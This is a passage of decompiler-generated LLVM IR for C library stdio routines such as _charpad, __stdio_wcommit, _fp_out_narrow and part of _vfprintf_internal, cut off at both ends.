  store i32 ptrtoint (i8* @global_var_e55c.404 to i32), i32* %r3.global-to-local, align 4
  store i32 45828, i32* @lr, align 4
  %v1_b300 = call i32 @__pthread_return_0()
  %v2_b304 = icmp eq i32 %v1_b300, 0
  %v0_b308 = load i32, i32* @r5, align 4
  store i32 %v0_b308, i32* @r0, align 4
  br i1 %v2_b304, label %dec_label_pc_b334, label %dec_label_pc_b310

dec_label_pc_b310:                                ; preds = %dec_label_pc_b2f8
  %v0_b310 = load i32, i32* @r4, align 4
  %v1_b310 = add i32 %v0_b310, 8
  %v2_b310 = inttoptr i32 %v1_b310 to i32*
  %v3_b310 = load i32, i32* %v2_b310, align 4
  store i32 %v3_b310, i32* %r3.global-to-local, align 4
  %v3_b318 = inttoptr i32 %v0_b310 to i8*
  store i8 48, i8* %v3_b318, align 1
  %v2_b320 = load i32, i32* @r4, align 4
  %v3_b320 = add i32 %v2_b320, 1
  %v4_b320 = inttoptr i32 %v3_b320 to i8*
  store i8 0, i8* %v4_b320, align 1
  %v0_b324 = load i32, i32* %r3.global-to-local, align 4
  %v1_b324 = load i32, i32* @r4, align 4
  %v2_b324 = add i32 %v1_b324, 20
  %v3_b324 = inttoptr i32 %v2_b324 to i32*
  store i32 %v0_b324, i32* %v3_b324, align 4
  %v0_b328 = load i32, i32* %r3.global-to-local, align 4
  %v1_b328 = load i32, i32* @r4, align 4
  %v2_b328 = add i32 %v1_b328, 24
  %v3_b328 = inttoptr i32 %v2_b328 to i32*
  store i32 %v0_b328, i32* %v3_b328, align 4
  %v0_b32c = load i32, i32* %r3.global-to-local, align 4
  %v1_b32c = load i32, i32* @r4, align 4
  %v2_b32c = add i32 %v1_b32c, 28
  %v3_b32c = inttoptr i32 %v2_b32c to i32*
  store i32 %v0_b32c, i32* %v3_b32c, align 4
  %v0_b330 = load i32, i32* %r3.global-to-local, align 4
  %v1_b330 = load i32, i32* @r4, align 4
  %v2_b330 = add i32 %v1_b330, 16
  %v3_b330 = inttoptr i32 %v2_b330 to i32*
  store i32 %v0_b330, i32* %v3_b330, align 4
  br label %dec_label_pc_b334

dec_label_pc_b334:                                ; preds = %dec_label_pc_b2f8, %dec_label_pc_b310
  store i32 1, i32* @r3, align 4
  %v1_b338 = load i32, i32* @r4, align 4
  %v2_b338 = add i32 %v1_b338, 52
  %v3_b338 = inttoptr i32 %v2_b338 to i32*
  store i32 1, i32* %v3_b338, align 4
  %v0_b33c = call i32 @__stdio_init_mutex()
  store i32 %v0_b33c, i32* %r0.global-to-local, align 4
  %v0_b340 = load i32, i32* @r4, align 4
  %v1_b340 = add i32 %v0_b340, 32
  %v2_b340 = inttoptr i32 %v1_b340 to i32*
  %storemerge = load i32, i32* %v2_b340, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v1_b344 = add i32 %storemerge, 56
  store i32 %v1_b344, i32* @r5, align 4
  %v2_b348 = icmp eq i32 %storemerge, 0
  store i32 %v1_b344, i32* %r0.global-to-local, align 4
  br i1 %v2_b348, label %dec_label_pc_b344.dec_label_pc_b354_crit_edge, label %dec_label_pc_b2f8

dec_label_pc_b344.dec_label_pc_b354_crit_edge:    ; preds = %dec_label_pc_b334
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_1d488.430 to i32*), align 4
  br label %dec_label_pc_b354

dec_label_pc_b354:                                ; preds = %dec_label_pc_b344.dec_label_pc_b354_crit_edge, %entry
  %v11_b37c13 = phi i32 [ %v1_b344, %dec_label_pc_b344.dec_label_pc_b354_crit_edge ], [ %v1_b3446, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_b344.dec_label_pc_b354_crit_edge ], [ 0, %entry ]
  store i32 ptrtoint (i32** @global_var_1d488.430 to i32), i32* %r3.global-to-local, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  %v2_b3744 = icmp eq i32 %storemerge12, 0
  br i1 %v2_b3744, label %dec_label_pc_b37c, label %dec_label_pc_b360

dec_label_pc_b360:                                ; preds = %dec_label_pc_b354, %dec_label_pc_b360
  %v0_b368 = phi i32 [ %storemerge1, %dec_label_pc_b360 ], [ %storemerge12, %dec_label_pc_b354 ]
  %v1_b360 = inttoptr i32 %v0_b368 to i8*
  %v2_b360 = load i8, i8* %v1_b360, align 1
  %v3_b360 = zext i8 %v2_b360 to i32
  store i32 %v3_b360, i32* %r3.global-to-local, align 4
  %v1_b364 = and i32 %v3_b360, 64
  store i32 %v0_b368, i32* %r0.global-to-local, align 4
  store i32 45936, i32* @lr, align 4
  %v1_b36c = icmp ne i32 %v1_b364, 0
  call void @__pseudo_cond_branch(i1 %v1_b36c, i32 ptrtoint (i32* @global_var_b390.441 to i32))
  %v0_b370 = load i32, i32* %r4.global-to-local, align 4
  %v1_b370 = add i32 %v0_b370, 32
  %v2_b370 = inttoptr i32 %v1_b370 to i32*
  %storemerge1 = load i32, i32* %v2_b370, align 4
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  %v2_b374 = icmp eq i32 %storemerge1, 0
  br i1 %v2_b374, label %dec_label_pc_b374.dec_label_pc_b37c_crit_edge, label %dec_label_pc_b360

dec_label_pc_b374.dec_label_pc_b37c_crit_edge:    ; preds = %dec_label_pc_b360
  %v11_b37c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b37c

dec_label_pc_b37c:                                ; preds = %dec_label_pc_b374.dec_label_pc_b37c_crit_edge, %dec_label_pc_b354
  %v11_b37c = phi i32 [ %v11_b37c.pre, %dec_label_pc_b374.dec_label_pc_b37c_crit_edge ], [ %v11_b37c13, %dec_label_pc_b354 ]
  %v2_b37c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_b37c, i32* @r4, align 4
  ret i32 %v11_b37c

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32 ()* @__stdio_init_mutex, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_b360, { 1, 0 }
  uselistorder label %dec_label_pc_b334, { 1, 0 }
  uselistorder label %dec_label_pc_b2f8, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_b390 = load i32, i32* @r4, align 4
  store i32 %v3_b390, i32* %stack_var_-8, align 4
  %v0_b394 = load i32, i32* @r0, align 4
  %v1_b394 = add i32 %v0_b394, 8
  %v2_b394 = inttoptr i32 %v1_b394 to i32*
  %v3_b394 = load i32, i32* %v2_b394, align 4
  %v1_b398 = add i32 %v0_b394, 16
  %v2_b398 = inttoptr i32 %v1_b398 to i32*
  %v3_b398 = load i32, i32* %v2_b398, align 4
  %v9_b39c = icmp eq i32 %v3_b398, %v3_b394
  store i32 %v0_b394, i32* %r4.global-to-local, align 4
  br i1 %v9_b39c, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_b394, i32* %v2_b398, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  store i32 46000, i32* @lr, align 4
  %v1_b3ac = xor i1 %v9_b39c, true
  call void @__pseudo_cond_branch(i1 %v1_b3ac, i32 ptrtoint (i32* @global_var_ee04.442 to i32))
  %v0_b3b0 = load i32, i32* %r4.global-to-local, align 4
  %v1_b3b0 = add i32 %v0_b3b0, 8
  %v2_b3b0 = inttoptr i32 %v1_b3b0 to i32*
  %v3_b3b0 = load i32, i32* %v2_b3b0, align 4
  %v1_b3b4 = add i32 %v0_b3b0, 16
  %v2_b3b4 = inttoptr i32 %v1_b3b4 to i32*
  %v3_b3b4 = load i32, i32* %v2_b3b4, align 4
  %v2_b3b8 = sub i32 %v3_b3b4, %v3_b3b0
  %v2_b3bc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_b3bc, i32* @r4, align 4
  ret i32 %v2_b3b8

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v3_b3c0 = load i32, i32* @r4, align 4
  %v6_b3c0 = load i32, i32* @r5, align 4
  %v9_b3c0 = load i32, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg3, i32* @r4, align 4
  store i8 %arg2, i8* %stack_var_-17, align 1
  %v2_b3e02 = icmp eq i32 %arg3, 0
  %v2_b3e4 = ptrtoint i8* %stack_var_-17 to i32
  br i1 %v2_b3e02, label %dec_label_pc_b400, label %dec_label_pc_b3f4

dec_label_pc_b3dc:                                ; preds = %dec_label_pc_b3f4
  %v1_b3dc = add i32 %v0_b3dc, -1
  store i32 %v1_b3dc, i32* @r4, align 4
  %v2_b3e0 = icmp eq i32 %v1_b3dc, 0
  %v0_b3ec = load i32, i32* @r6, align 4
  br i1 %v2_b3e0, label %dec_label_pc_b400.loopexit, label %dec_label_pc_b3f4

dec_label_pc_b3f4:                                ; preds = %entry, %dec_label_pc_b3dc
  %v0_b3ec4 = phi i32 [ %v0_b3ec, %dec_label_pc_b3dc ], [ %arg1, %entry ]
  %v3_b3f4 = call i32 @__stdio_fwrite(i32 %v2_b3e4, i32 1, i32 %v0_b3ec4)
  %v7_b3f8 = icmp eq i32 %v3_b3f4, 1
  %v0_b3dc = load i32, i32* @r4, align 4
  br i1 %v7_b3f8, label %dec_label_pc_b3dc, label %dec_label_pc_b400.loopexit

dec_label_pc_b400.loopexit:                       ; preds = %dec_label_pc_b3dc, %dec_label_pc_b3f4
  %v0_b400.ph = phi i32 [ %v0_b3dc, %dec_label_pc_b3f4 ], [ 0, %dec_label_pc_b3dc ]
  %v1_b400.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_b400

dec_label_pc_b400:                                ; preds = %dec_label_pc_b400.loopexit, %entry
  %v1_b400 = phi i32 [ 0, %entry ], [ %v1_b400.pre, %dec_label_pc_b400.loopexit ]
  %v0_b400 = phi i32 [ 0, %entry ], [ %v0_b400.ph, %dec_label_pc_b400.loopexit ]
  %v2_b400 = sub i32 %v1_b400, %v0_b400
  store i32 %v3_b3c0, i32* @r4, align 4
  store i32 %v6_b3c0, i32* @r5, align 4
  store i32 %v9_b3c0, i32* @r6, align 4
  ret i32 %v2_b400

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_b400.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_b3f4, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_b40c = load i32, i32* @r4, align 4
  store i32 %v3_b40c, i32* %stack_var_-24, align 4
  %v9_b40c = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_b414 = and i32 %arg2, 128
  %v2_b414 = icmp eq i32 %v1_b414, 0
  %v0_b418 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_b418, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_b414, label %bb, label %dec_label_pc_b42c

bb:                                               ; preds = %entry
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_b46c

dec_label_pc_b42c:                                ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_b430 = call i32 @strlen(i8* %arg4)
  store i32 %v3_b430, i32* %r0.global-to-local, align 4
  %v1_b434 = load i32, i32* %r4.global-to-local, align 4
  %v2_b434 = sub i32 %v1_b434, %v3_b430
  store i32 %v2_b434, i32* @r4, align 4
  store i32 %v3_b430, i32* @r5, align 4
  %tmp16 = icmp slt i32 %v2_b434, 1
  br i1 %tmp16, label %.thread, label %dec_label_pc_b44c

.thread:                                          ; preds = %dec_label_pc_b42c
  store i32 %v3_b430, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_b46c

dec_label_pc_b44c:                                ; preds = %dec_label_pc_b42c
  %v0_b44c = load i32, i32* @r6, align 4
  %v1_b44c = urem i32 %v0_b44c, 128
  %v0_b450 = load i32, i32* @r8, align 4
  store i32 %v0_b450, i32* %r0.global-to-local, align 4
  %v3_b458 = trunc i32 %v1_b44c to i8
  %v4_b458 = call i32 @_charpad(i32 %v0_b450, i8 %v3_b458, i32 %v2_b434)
  store i32 %v4_b458, i32* %r0.global-to-local, align 4
  %v1_b45c = load i32, i32* @r4, align 4
  %v9_b45c = icmp eq i32 %v4_b458, %v1_b45c
  store i32 %v4_b458, i32* %r6.global-to-local, align 4
  br i1 %v9_b45c, label %dec_label_pc_b468, label %dec_label_pc_b488

dec_label_pc_b468:                                ; preds = %dec_label_pc_b44c
  %v0_b468 = load i32, i32* @r5, align 4
  store i32 %v0_b468, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b46c

dec_label_pc_b46c:                                ; preds = %bb, %.thread, %dec_label_pc_b468
  %v5_b478 = phi i32 [ %v0_b468, %dec_label_pc_b468 ], [ %arg3, %bb ], [ %v3_b430, %.thread ]
  %tmp17 = icmp slt i32 %v5_b478, 1
  br i1 %tmp17, label %.thread8, label %bb18

.thread8:                                         ; preds = %dec_label_pc_b46c
  br label %bb19

bb18:                                             ; preds = %dec_label_pc_b46c
  %v5_b474 = load i32, i32* @r7, align 4
  br label %bb19

bb19:                                             ; preds = %.thread8, %bb18
  %storemerge = phi i32 [ 0, %.thread8 ], [ %v5_b474, %bb18 ]
  %tmp20 = phi i1 [ false, %.thread8 ], [ true, %bb18 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp20, i32 ptrtoint (i32* @global_var_eec0.443 to i32))
  %v0_b484 = load i32, i32* %r6.global-to-local, align 4
  %v2_b484 = add i32 %storemerge, %v0_b484
  store i32 %v2_b484, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_b488

dec_label_pc_b488:                                ; preds = %dec_label_pc_b44c, %bb19
  %v0_b488 = phi i32 [ %v4_b458, %dec_label_pc_b44c ], [ %v2_b484, %bb19 ]
  store i32 %v0_b488, i32* %r0.global-to-local, align 4
  %v2_b48c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_b48c, i32* %r4.global-to-local, align 4
  store i32 %v9_b40c, i32* %r6.global-to-local, align 4
  ret i32 %v0_b488

; uselistorder directives
  uselistorder i32 %v0_b488, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_b488, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_b46c, { 2, 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp97 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i8 @__decompiler_undefined_function_1()
  %tmp100 = call i32 @__decompiler_undefined_function_0()
  %tmp101 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i32 @__decompiler_undefined_function_0()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i8 @__decompiler_undefined_function_1()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_b490 = load i32, i32* @r4, align 4
  store i32 %v3_b490, i32* %stack_var_-36, align 4
  %v6_b490 = load i32, i32* @r5, align 4
  %v15_b490 = load i32, i32* @r8, align 4
  %v18_b490 = load i32, i32* @sb, align 4
  %v21_b490 = load i32, i32* @sl, align 4
  %v24_b490 = load i32, i32* @fp, align 4
  %v2_b498 = ptrtoint i32* %stack_var_-332 to i32
  store i32 %v2_b498, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_b498, i32* %r0.global-to-local, align 4
  %v0_b4a4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_b4a4, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_b4ac = call i32 @_ppfs_init(i32* nonnull %stack_var_-332)
  store i32 %v2_b4ac, i32* %r0.global-to-local, align 4
  %v1_b4b0 = icmp slt i32 %v2_b4ac, 0
  br i1 %v1_b4b0, label %dec_label_pc_b4b8, label %dec_label_pc_b4ec

dec_label_pc_b4b8:                                ; preds = %entry
  %v3_b4b8 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_b4b8, i32* @r4, align 4
  %v1_b4bc = inttoptr i32 %v3_b4b8 to i8*
  store i32 %v3_b4b8, i32* %r0.global-to-local, align 4
  %v3_b4c0 = call i32 @strlen(i8* %v1_b4bc)
  store i32 %v3_b4c0, i32* %r0.global-to-local, align 4
  %v2_b4c4 = icmp eq i32 %v3_b4c0, 0
  br i1 %v2_b4c4, label %bb, label %dec_label_pc_b4d4

bb:                                               ; preds = %dec_label_pc_b4b8
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ba64

dec_label_pc_b4d4:                                ; preds = %dec_label_pc_b4b8
  %v0_b4d4 = load i32, i32* @r4, align 4
  store i32 %v0_b4d4, i32* %r0.global-to-local, align 4
  %v0_b4d8 = load i32, i32* @fp, align 4
  store i32 %v0_b4d8, i32* %r2.global-to-local, align 4
  %v3_b4dc = call i32 @__stdio_fwrite(i32 %v0_b4d4, i32 %v3_b4c0, i32 %v0_b4d8)
  store i32 %v3_b4dc, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ba64

dec_label_pc_b4ec:                                ; preds = %entry
  store i32 %v2_b498, i32* %r0.global-to-local, align 4
  %v0_b4f0 = load i32, i32* @r5, align 4
  %v2_b4f4 = call i32 @_ppfs_prepargs(i32 %v2_b498, i32 %v0_b4f0)
  store i32 %v2_b4f4, i32* %r0.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  %v4_b594 = zext i8 %tmp104 to i32
  %v2_b59c = ptrtoint i32* %stack_var_-252 to i32
  %v2_b5bc = ptrtoint i32* %stack_var_-36 to i32
  %v2_b5d4 = icmp eq i32 %tmp102, 0
  %v1_b5e8 = inttoptr i32 %tmp101 to i32*
  %v2_b8d8 = ptrtoint i32* %stack_var_-180 to i32
  %v2_b7f4 = ptrtoint i32* %stack_var_-44 to i32
  %v2_b808 = ptrtoint i32* %stack_var_-52 to i32
  %v3_b7a4 = add i32 %tmp101, 4
  %v4_b7a4 = inttoptr i32 %v3_b7a4 to i32*
  %v2_b7a8 = ptrtoint i32* %stack_var_-328 to i32
  %v7_b668 = zext i8 %tmp99 to i32
  %v2_b6a4 = ptrtoint i32* %stack_var_-53 to i32
  %v5_b6ac = bitcast i32* %stack_var_-53 to i8*
  %v2_b6b4 = icmp ugt i32 %tmp102, 4
  %v7_b6b4 = icmp eq i32 %tmp102, 5
  %v0_ba4c.pre = load i32, i32* @r4, align 4
  %tmp132 = icmp slt i32 %tmp105, 1
  %v5_b5cc187 = icmp sgt i32 %tmp103, 0
  %tmp195 = icmp ugt i32 %tmp102, 7
  %tmp196 = icmp ugt i32 %tmp102, 15
  %v2_b7c8 = icmp ugt i32 %tmp102, 16
  %v7_b7c8 = icmp eq i32 %tmp102, 17
  %v2_b7cc = xor i1 %v7_b7c8, true
  %v3_b7cc = and i1 %v2_b7c8, %v2_b7cc
  %v2_b868 = icmp ugt i32 %tmp102, 18
  %v7_b868 = icmp eq i32 %tmp102, 19
  %v2_b86c = xor i1 %v7_b868, true
  %v3_b86c = and i1 %v2_b868, %v2_b86c
  %v7_b8cc = icmp eq i32 %tmp102, 20
  %v2_b60c = add i32 %tmp102, ptrtoint (i32* @global_var_13730.445 to i32)
  %v1_b610 = add i32 %tmp102, add (i32 ptrtoint (i32* @global_var_13730.445 to i32), i32 -1)
  %v2_b610 = inttoptr i32 %v1_b610 to i8*
  %v2_b63c = xor i1 %v7_b6b4, true
  %v3_b63c = and i1 %v2_b6b4, %v2_b63c
  %v7_b670 = icmp eq i32 %tmp102, 1
  %v2_b6bc = xor i1 %v2_b6b4, true
  %v3_b6bc = or i1 %v7_b6b4, %v2_b6bc
  %tmp197 = icmp ult i32 %tmp102, 3
  %v7_b724 = icmp eq i32 %tmp102, 3
  %v11_b730 = icmp eq i32 %tmp102, 4
  %v9_b5a0 = mul nuw nsw i32 %v4_b594, 8
  %v10_b5a0 = add nsw i32 %v9_b5a0, -8
  %v6_b5a8 = add i32 %v10_b5a0, %v2_b59c
  br label %dec_label_pc_ba4c

bb126:                                            ; preds = %dec_label_pc_b504.outer, %.thread7
  %v2_b504185 = phi i8 [ %v2_b504, %.thread7 ], [ %v2_b504181, %dec_label_pc_b504.outer ]
  %v1_b518184 = phi i32 [ %v2_b518, %.thread7 ], [ %v0_b50449, %dec_label_pc_b504.outer ]
  %v8_b50c = icmp eq i8 %v2_b504185, 37
  br i1 %v8_b50c, label %dec_label_pc_b520, label %.thread7

.thread7:                                         ; preds = %bb126
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_b518 = add i32 %v1_b518184, 1
  store i32 %v2_b518, i32* @r4, align 4
  %v1_b504 = inttoptr i32 %v2_b518 to i8*
  %v2_b504 = load i8, i8* %v1_b504, align 1
  %v3_b504 = zext i8 %v2_b504 to i32
  store i32 %v3_b504, i32* %r3.global-to-local, align 4
  %v2_b508 = icmp eq i8 %v2_b504, 0
  br i1 %v2_b508, label %dec_label_pc_b520, label %bb126

dec_label_pc_b520:                                ; preds = %bb126, %.thread7, %dec_label_pc_b504.outer
  %v1_b518.lcssa = phi i32 [ %v0_b50449, %dec_label_pc_b504.outer ], [ %v2_b518, %.thread7 ], [ %v1_b518184, %bb126 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_b520 = sub i32 %v1_b518.lcssa, %v5_b530
  %v9_b520 = icmp eq i32 %v1_b518.lcssa, %v5_b530
  br i1 %v9_b520, label %dec_label_pc_b554, label %dec_label_pc_b528

dec_label_pc_b528:                                ; preds = %dec_label_pc_b520
  store i32 %v2_b520, i32* @r5, align 4
  %tmp128 = icmp slt i32 %v2_b520, 1
  br i1 %tmp128, label %bb130, label %bb129

bb129:                                            ; preds = %dec_label_pc_b528
  store i32 %v5_b530, i32* %r0.global-to-local, align 4
  %v5_b538 = load i32, i32* @fp, align 4
  store i32 %v5_b538, i32* %r2.global-to-local, align 4
  br label %bb130

bb130:                                            ; preds = %dec_label_pc_b528, %bb129
  %tmp131 = phi i1 [ true, %bb129 ], [ false, %dec_label_pc_b528 ]
  call void @__pseudo_cond_branch(i1 %tmp131, i32 ptrtoint (i32* @global_var_eec0.443 to i32))
  %v0_b540 = load i32, i32* %r0.global-to-local, align 4
  %v1_b540 = load i32, i32* @r5, align 4
  %v9_b540 = icmp eq i32 %v0_b540, %v1_b540
  br i1 %v9_b540, label %dec_label_pc_b548, label %dec_label_pc_ba5c

dec_label_pc_b548:                                ; preds = %bb130
  %v2_b54c = add i32 %v0_b540, %stack_var_-336.1.ph
  store i32 %v2_b54c, i32* @lr, align 4
  %v0_b554.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b554

dec_label_pc_b554:                                ; preds = %dec_label_pc_b520, %dec_label_pc_b548
  %v0_b568 = phi i32 [ %v5_b530, %dec_label_pc_b520 ], [ %v0_b554.pre, %dec_label_pc_b548 ]
  %stack_var_-336.2 = phi i32 [ %stack_var_-336.1.ph, %dec_label_pc_b520 ], [ %v2_b54c, %dec_label_pc_b548 ]
  %v1_b554 = inttoptr i32 %v0_b568 to i8*
  %v2_b554 = load i8, i8* %v1_b554, align 1
  %v3_b554 = zext i8 %v2_b554 to i32
  store i32 %v3_b554, i32* %r3.global-to-local, align 4
  %v2_b558 = icmp eq i8 %v2_b554, 0
  br i1 %v2_b558, label %dec_label_pc_ba64, label %dec_label_pc_b560

dec_label_pc_b560:                                ; preds = %dec_label_pc_b554
  %v1_b560 = add i32 %v0_b568, 1
  %v2_b560 = inttoptr i32 %v1_b560 to i8*
  %v3_b560 = load i8, i8* %v2_b560, align 1
  %v4_b560 = zext i8 %v3_b560 to i32
  store i32 %v4_b560, i32* %r3.global-to-local, align 4
  %v7_b564 = icmp eq i8 %v3_b560, 37
  store i32 %v1_b560, i32* %r2.global-to-local, align 4
  br i1 %v7_b564, label %dec_label_pc_ba54, label %dec_label_pc_b570

dec_label_pc_b570:                                ; preds = %dec_label_pc_b560
  store i32 %v2_b498, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_b498, i32* %r0.global-to-local, align 4
  store i32 %v1_b560, i32* %stack_var_-332, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_b584 = call i32 @_ppfs_parsespec(i32* nonnull %stack_var_-332)
  store i32 %v2_b498, i32* @r0, align 4
  %v0_b58c = call i32 @_ppfs_setargs()
  store i32 %v0_b58c, i32* %r0.global-to-local, align 4
  store i32 %v4_b594, i32* @ip, align 4
  store i32 %v2_b59c, i32* %r3.global-to-local, align 4
  br i1 %tmp132, label %.thread, label %bb133

.thread:                                          ; preds = %dec_label_pc_b570
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  br label %bb134

bb133:                                            ; preds = %dec_label_pc_b570
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  store i32 %v6_b5a8, i32* %r3.global-to-local, align 4
  br label %bb134

bb134:                                            ; preds = %.thread, %bb133
  %v0_b5b478 = phi i32 [ %v6_b5a8, %bb133 ], [ %v2_b59c, %.thread ]
  store i32 %v2_b5bc, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_b5cc187, label %dec_label_pc_b5b4, label %dec_label_pc_b5d0

dec_label_pc_b5b4:                                ; preds = %bb134, %dec_label_pc_b5b4
  %v5_b5c4189 = phi i32 [ %v5_b5c4, %dec_label_pc_b5b4 ], [ %v2_b5bc, %bb134 ]
  %v0_b5b4188 = phi i32 [ %v1_b5b8, %dec_label_pc_b5b4 ], [ %v0_b5b478, %bb134 ]
  %v2_b5b4 = add i32 %v5_b5c4189, -4
  %v3_b5b4 = inttoptr i32 %v2_b5b4 to i32*
  store i32 %v0_b5b4188, i32* %v3_b5b4, align 4
  %v0_b5b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b5b8 = add i32 %v0_b5b8, 8
  store i32 %v1_b5b8, i32* %r3.global-to-local, align 4
  %v0_b5c0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_b5c0.pre = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_b5bc, i32* @lr, align 4
  %v4_b5c4 = mul i32 %v0_b5c0.pre, 4
  %v5_b5c4 = add i32 %v4_b5c4, %v2_b5bc
  %v1_b5c8 = add i32 %v0_b5c0.pre, 1
  store i32 %v1_b5c8, i32* %r2.global-to-local, align 4
  %v5_b5cc = icmp slt i32 %v0_b5c0.pre, %v1_b5c0.pre
  br i1 %v5_b5cc, label %dec_label_pc_b5b4, label %dec_label_pc_b5d0

dec_label_pc_b5d0:                                ; preds = %dec_label_pc_b5b4, %bb134
  store i32 %tmp102, i32* %r2.global-to-local, align 4
  br i1 %v2_b5d4, label %dec_label_pc_b5dc, label %dec_label_pc_b600

dec_label_pc_b5dc:                                ; preds = %dec_label_pc_b5d0
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-336.2, i32* @ip, align 4
  %v2_b5e8 = load i32, i32* %v1_b5e8, align 4
  store i32 %v2_b5e8, i32* %r0.global-to-local, align 4
  %v1_b5ec = and i32 %v0_b630, 3840
  store i32 %stack_var_-336.2, i32* %r2.global-to-local, align 4
  %v3_b5f4 = ashr i32 %stack_var_-336.2, 31
  store i32 %v3_b5f4, i32* %r3.global-to-local, align 4
  %v4_b5f8 = inttoptr i32 %v2_b5e8 to i8*
  %v5_b5f8 = call i32 @_store_inttype(i8* %v4_b5f8, i32 %v1_b5ec, i32 %stack_var_-336.2, i32 %v3_b5f4)
  store i32 %v5_b5f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ba48

dec_label_pc_b600:                                ; preds = %dec_label_pc_b5d0
  br i1 %tmp195, label %dec_label_pc_b78c, label %dec_label_pc_b608

dec_label_pc_b608:                                ; preds = %dec_label_pc_b600
  store i32 %v2_b60c, i32* %r3.global-to-local, align 4
  %v3_b610 = load i8, i8* %v2_b610, align 1
  %v4_b610 = zext i8 %v3_b610 to i32
  store i32 %v4_b610, i32* @r4, align 4
  %v7_b614 = icmp eq i8 %v3_b610, 10
  br i1 %v7_b614, label %dec_label_pc_b620, label %bb135

bb135:                                            ; preds = %dec_label_pc_b608
